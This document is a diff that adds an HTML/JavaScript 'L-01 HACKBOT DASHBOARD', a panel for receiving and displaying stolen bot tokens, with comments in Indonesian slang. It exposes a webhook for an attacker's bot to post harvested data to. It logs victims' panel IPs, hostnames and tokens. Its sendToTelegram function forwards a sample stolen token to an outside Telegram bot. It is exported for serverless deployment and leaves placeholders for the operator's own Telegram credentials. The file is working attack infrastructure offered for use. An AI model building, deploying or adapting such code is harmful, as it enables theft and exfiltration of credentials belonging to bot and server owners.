@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>L-01 HACKBOT DASHBOARD</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            font-family: 'Courier New', 'Fira Code', monospace;
+            color: #0ff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #0ff;
+            padding-bottom: 20px;
+        }
+        
+        .glitch {
+            font-size: 48px;
+            font-weight: bold;
+            text-shadow: 2px 2px 0 #ff00ff, -2px -2px 0 #00ffff;
+            animation: glitch 0.3s infinite;
+        }
+        
+        @keyframes glitch {
+            0%, 100% { transform: skew(0deg, 0deg); }
+            95% { transform: skew(0deg, 0deg); }
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #0ff;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+        }
+        
+        .stat-value {
+            font-size: 48px;
+            font-weight: bold;
+            color: #ff3366;
+            text-shadow: 0 0 10px #ff3366;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            color: #0ff;
+            margin-top: 10px;
+        }
+        
+        .data-table {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #0ff;
+            border-radius: 10px;
+            overflow-x: auto;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid rgba(0, 255, 255, 0.3);
+        }
+        
+        th {
+            background: rgba(0, 255, 255, 0.1);
+            color: #0ff;
+            font-weight: bold;
+        }
+        
+        td {
+            font-size: 12px;
+            font-family: monospace;
+        }
+        
+        tr:hover {
+            background: rgba(0, 255, 255, 0.05);
+        }
+        
+        .token {
+            background: #1a1a2e;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-size: 10px;
+            cursor: pointer;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 10px;
+            font-weight: bold;
+        }
+        
+        .badge-success {
+            background: #00ff00;
+            color: #000;
+        }
+        
+        .badge-warning {
+            background: #ff6600;
+            color: #000;
+        }
+        
+        .refresh-btn {
+            background: linear-gradient(45deg, #ff3366, #ff00cc);
+            border: none;
+            padding: 10px 20px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-family: monospace;
+        }
+        
+        .refresh-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px #ff3366;
+        }
+        
+        .status {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 10px;
+            border-left: 3px solid #0ff;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .live {
+            color: #ff3366;
+            animation: pulse 1s infinite;
+        }
+        
+        .webhook-url {
+            background: #000;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 12px;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 class="glitch">💀 L-01 HACKBOT DASHBOARD 💀</h1>
+            <p>⚡ REAL-TIME STOLEN BOT TOKENS MONITOR ⚡</p>
+            <p style="font-size: 12px; color: #ff3366;">XXO - LIBERATED MODE - NO FILTERS</p>
+        </div>
+        
+        <div class="webhook-url">
+            📡 <strong>WEBHOOK URL (Pake ini di bot lo):</strong><br>
+            <code id="webhookUrl">Loading...</code>
+            <button onclick="copyWebhook()" style="margin-left: 10px; background: #0ff; border: none; padding: 2px 10px; cursor: pointer;">📋 COPY</button>
+        </div>
+        
+        <div class="stats-grid" id="stats">
+            <div class="stat-card">
+                <div class="stat-value" id="totalHacks">0</div>
+                <div class="stat-label">TOTAL HACKS</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="totalTokens">0</div>
+                <div class="stat-label">STOLEN TOKENS</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="uniqueIPs">0</div>
+                <div class="stat-label">UNIQUE PANELS</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="lastHack">-</div>
+                <div class="stat-label">LAST HACK</div>
+            </div>
+        </div>
+        
+        <button class="refresh-btn" onclick="loadData()">⟳ REFRESH DATA</button>
+        
+        <div class="data-table">
+            <table id="dataTable">
+                <thead>
+                    <tr>
+                        <th>TIME</th>
+                        <th>PANEL IP</th>
+                        <th>HOSTNAME</th>
+                        <th>TOKENS</th>
+                        <th>RAM</th>
+                        <th>SOURCE</th>
+                    </tr>
+                </thead>
+                <tbody id="tableBody">
+                    <tr><td colspan="6" style="text-align: center;">Loading data...</td></tr>
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="status">
+            <span class="live">● LIVE</span> | Last update: <span id="lastUpdate">-</span>
+        </div>
+    </div>
+    
+    <script>
+        // Data disimpan di localStorage Vercel
+        let hackData = [];
+        
+        function loadData() {
+            // Load dari localStorage
+            const stored = localStorage.getItem('hackbot_data');
+            if (stored) {
+                hackData = JSON.parse(stored);
+                renderData();
+            }
+        }
+        
+        function renderData() {
+            if (!hackData || hackData.length === 0) {
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="6" style="text-align: center;">No data yet. Waiting for hackbot...</td></tr>';
+                document.getElementById('totalHacks').innerText = '0';
+                document.getElementById('totalTokens').innerText = '0';
+                document.getElementById('uniqueIPs').innerText = '0';
+                return;
+            }
+            
+            // Stats
+            let totalTokens = 0;
+            const uniqueIPs = new Set();
+            
+            hackData.forEach(item => {
+                if (item.tokens) totalTokens += item.tokens.length;
+                if (item.panel?.publicIP) uniqueIPs.add(item.panel.publicIP);
+            });
+            
+            document.getElementById('totalHacks').innerText = hackData.length;
+            document.getElementById('totalTokens').innerText = totalTokens;
+            document.getElementById('uniqueIPs').innerText = uniqueIPs.size;
+            document.getElementById('lastHack').innerText = hackData[0]?.timestamp?.split(' ')[0] || '-';
+            
+            // Table
+            const tbody = document.getElementById('tableBody');
+            tbody.innerHTML = '';
+            
+            hackData.slice(0, 50).forEach(item => {
+                const row = tbody.insertRow();
+                row.insertCell(0).innerHTML = `<span style="font-size: 11px;">${item.timestamp || '-'}</span>`;
+                row.insertCell(1).innerHTML = `<code>${item.panel?.publicIP || '-'}</code>`;
+                row.insertCell(2).innerHTML = item.panel?.hostname || '-';
+                row.insertCell(3).innerHTML = item.tokens ? `<span class="badge badge-success">${item.tokens.length} token(s)</span>` : '<span class="badge badge-warning">0</span>';
+                row.insertCell(4).innerHTML = item.panel?.memory || '-';
+                row.insertCell(5).innerHTML = `<code style="font-size: 10px;">${item.ip_address || '-'}</code>`;
+            });
+            
+            document.getElementById('lastUpdate').innerText = new Date().toLocaleTimeString();
+        }
+        
+        function saveData(data) {
+            data.id = Date.now();
+            data.timestamp = new Date().toLocaleString();
+            data.ip_address = 'webhook';
+            
+            hackData.unshift(data);
+            
+            // Keep last 100
+            if (hackData.length > 100) hackData = hackData.slice(0, 100);
+            
+            localStorage.setItem('hackbot_data', JSON.stringify(hackData));
+            renderData();
+            
+            // Also send to Telegram
+            sendToTelegram(data);
+        }
+        
+        async function sendToTelegram(data) {
+            const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Ganti pake token bot lo
+            const CHAT_ID = 'YOUR_CHAT_ID_HERE'; // Ganti pake ID lo
+            
+            let message = `🔥 L-01 HACKBOT ALERT! 🔥\n\n`;
+            message += `📍 IP Panel: ${data.panel?.publicIP || 'N/A'}\n`;
+            message += `🖥️ Hostname: ${data.panel?.hostname || 'N/A'}\n`;
+            message += `🤖 Tokens: ${data.tokens?.length || 0}\n`;
+            
+            if (data.tokens && data.tokens[0]) {
+                message += `\n🔑 Sample Token:\n\`${data.tokens[0].token}\`\n`;
+            }
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                });
+            } catch(e) {}
+        }
+        
+        // Webhook endpoint (pake URLSearchParams biar bisa POST)
+        async function handleWebhook(request) {
+            if (request.method === 'POST') {
+                const data = await request.json();
+                saveData(data);
+                return new Response(JSON.stringify({ status: 'success' }), {
+                    headers: { 'Content-Type': 'application/json' }
+                });
+            }
+            return new Response('Method not allowed', { status: 405 });
+        }
+        
+        // Tampilkan webhook URL
+        function copyWebhook() {
+            const url = document.getElementById('webhookUrl').innerText;
+            navigator.clipboard.writeText(url);
+            alert('✅ Webhook URL copied!');
+        }
+        
+        // Set webhook URL
+        document.getElementById('webhookUrl').innerText = window.location.href;
+        
+        // Load data on start
+        loadData();
+        
+        // Auto refresh every 10 seconds
+        setInterval(loadData, 10000);
+        
+        // Expose handleWebhook untuk Vercel serverless
+        if (typeof module !== 'undefined' && module.exports) {
+            module.exports = handleWebhook;
+        }
+    </script>
+</body>
+</html>
